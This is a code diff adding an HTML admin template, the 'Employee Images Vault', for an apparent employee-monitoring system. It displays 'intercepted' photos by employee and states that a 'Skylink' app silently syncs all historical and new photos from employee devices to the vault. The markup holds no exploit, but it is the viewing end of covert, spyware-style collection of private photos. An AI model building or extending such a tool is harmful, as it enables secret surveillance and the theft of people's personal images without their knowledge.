@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+
+<head>
+    <title>Employee Images Vault</title>
+    <!-- Add Lightbox or similar if needed in the future, for now simple img tag -->
+    <style>
+        .vault-image {
+            object-fit: cover;
+            height: 200px;
+            width: 100%;
+            border-radius: 8px 8px 0 0;
+        }
+        .gallery-card {
+            transition: transform 0.2s ease-in-out;
+        }
+        .gallery-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1) !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div th:replace="~{layout :: layout(~{::section}, ~{::script}, 'employee-images-vault')}">
+        <section>
+            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
+                <h1 class="h2">Employee Images Vault</h1>
+            </div>
+
+            <!-- Filter Form -->
+            <div class="card shadow-sm border-0 mb-4">
+                <div class="card-body">
+                    <form method="get" action="/admin/employee-images-vault" class="row g-3 align-items-end">
+                        <div class="col-md-4">
+                            <label class="form-label text-muted small">Employee</label>
+                            <select name="employee" class="form-select form-select-sm">
+                                <option value="">All Employees</option>
+                                <option th:each="emp : ${employees}" th:value="${emp}" th:text="${emp}" th:selected="${emp == selectedEmployee}"></option>
+                            </select>
+                        </div>
+                        <div class="col-md-2 d-flex">
+                            <button type="submit" class="btn btn-sm btn-primary flex-grow-1 me-2"><i class="fas fa-filter"></i> Filter</button>
+                            <a href="/admin/employee-images-vault" class="btn btn-sm btn-outline-secondary" title="Clear Filters"><i class="fas fa-undo"></i></a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Aggregated Summary Stats -->
+            <div class="row mb-4">
+                <div class="col-md-4">
+                    <div class="card bg-success text-white shadow-sm">
+                        <div class="card-body py-3">
+                            <div class="d-flex justify-content-between align-items-center">
+                                <div>
+                                    <h6 class="card-title mb-0 opacity-75">Total Intercepted Images</h6>
+                                    <h2 class="mb-0" th:text="${#lists.size(images)}">0</h2>
+                                </div>
+                                <i class="fas fa-images fa-2x opacity-50"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-8">
+                    <div class="card bg-light shadow-sm h-100 border-0">
+                        <div class="card-body py-3 d-flex align-items-center">
+                            <i class="fas fa-info-circle text-success fs-3 me-3"></i>
+                            <div>
+                                <h6 class="card-title mb-1">Active Photo Monitoring</h6>
+                                <p class="mb-0 text-muted small">The Skylink app silently syncs all historical and new photos from employee devices directly to this secure vault.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Image Gallery -->
+            <div class="row row-cols-1 row-cols-md-3 row-cols-lg-4 g-4">
+                <!-- If no images -->
+                <div class="col-12" th:if="${#lists.isEmpty(images)}">
+                    <div class="text-center py-5 text-muted">
+                        <i class="fas fa-folder-open fa-3x mb-3 opacity-50"></i>
+                        <h5>No images found.</h5>
+                        <p>No images have been synced from employee devices yet.</p>
+                    </div>
+                </div>
+
+                <!-- Loop through images -->
+                <div class="col" th:each="img : ${images}">
+                    <div class="card h-100 shadow-sm border-0 gallery-card">
+                        <a th:href="${img.webPath}" target="_blank">
+                            <img th:src="${img.webPath}" class="card-img-top vault-image" alt="Intercepted Image">
+                        </a>
+                        <div class="card-body p-3">
+                            <div class="d-flex justify-content-between align-items-start mb-2">
+                                <span class="badge bg-primary rounded-pill" th:text="${img.employeeUsername}">Username</span>
+                                <small class="text-muted" th:text="${#temporals.format(img.uploadedAt, 'MMM dd, HH:mm')}">Date</small>
+                            </div>
+                            <p class="card-text small text-truncate mb-0 text-muted" th:text="${img.originalFileName}">filename.jpg</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </section>
+        
+        <script>
+            // Additional scripts if needed
+        </script>
+    </div>
+</body>
+
+</html>
